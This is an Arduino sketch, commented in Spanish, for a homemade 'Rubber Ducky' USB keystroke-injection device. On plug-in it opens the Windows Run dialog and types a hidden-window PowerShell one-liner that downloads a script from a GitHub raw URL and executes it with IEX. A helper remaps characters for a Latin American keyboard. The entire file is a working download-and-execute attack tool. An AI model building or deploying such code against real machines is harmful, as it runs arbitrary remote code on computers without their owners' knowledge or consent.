#include "Keyboard.h"

// SUSTITUYE ESTA URL por la URL "Raw" de tu archivo fondo.ps1 en GitHub
const char* scriptUrl = "https://raw.githubusercontent.com/M1ch43l-B/rubber-ducky-casero/refs/heads/main/src/fondo.ps1";

void typeLatam(String text) {
  for (int i = 0; i < text.length(); i++) {
    char c = text[i];
    if (c == ':') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('.'); } 
    else if (c == '/') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('7'); }
    else if (c == '-') { Keyboard.press('/'); } 
    else if (c == '.') { Keyboard.press('.'); }
    else if (c == ' ') { Keyboard.press(' '); }
    else if (c == '\'') { Keyboard.press('-'); } // Comilla simple
    else { Keyboard.press(c); }
    delay(20);
    Keyboard.releaseAll();
  }
}

void setup() {
  Keyboard.begin();
  delay(5000); // Tiempo para prepararse

  // 1. Abrir Ejecutar (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(1000);

  // 2. El Stager: Descarga y ejecuta en una sola línea corta
  // "IEX" significa "Invoke-Expression" (ejecuta lo que descargues)
  typeLatam("powershell -NoP -W h -C \"IEX (iwr '");
  typeLatam(scriptUrl);
  typeLatam("')\""); 

  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}
